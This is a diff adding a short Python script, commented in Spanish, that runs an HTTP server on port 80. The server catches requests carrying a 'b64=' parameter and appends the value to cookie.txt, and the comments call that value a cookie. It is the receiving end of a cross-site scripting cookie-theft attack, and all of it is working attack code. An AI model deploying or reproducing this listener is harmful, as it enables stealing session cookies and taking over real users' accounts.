@@ -1,0 +1,44 @@
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import os
+
+# Configuración del servidor
+host = '0.0.0.0'
+puerto = 80
+
+# Ruta del archivo de registro
+ruta_archivo_log = 'archivo_log.txt'
+
+class ManejadorSolicitud(BaseHTTPRequestHandler):
+    def do_GET(self):
+        # Si la URL contiene el patrón específico, almacenar la línea en el archivo
+        if '/?b64=' in self.path:
+            log_line = f"{self.address_string()} - - [{self.log_date_time_string()}] \"{self.requestline}\" 200 -\n"
+            with open(ruta_archivo_log, 'a') as archivo:
+                archivo.write(log_line)
+
+            # Extraer el valor de la cookie
+            cookie_value = self.path.split('b64=')[1]
+
+            # Guardar la cookie en un archivo en el directorio actual
+            ruta_archivo_cookie = os.path.join(os.getcwd(), 'cookie.txt')
+            with open(ruta_archivo_cookie, 'a') as cookie_file:
+                cookie_file.write(cookie_value + '\n')
+
+        # Responder con un código 200 OK
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write('Solicitud recibida con éxito'.encode('utf-8'))
+
+def iniciar_servidor():
+    server_address = (host, puerto)
+    httpd = HTTPServer(server_address, ManejadorSolicitud)
+    print(f'Servidor HTTP iniciado en http://{host}:{puerto}')
+
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print('\nDeteniendo el servidor...')
+        httpd.server_close()
+
+if __name__ == '__main__':
+    iniciar_servidor()
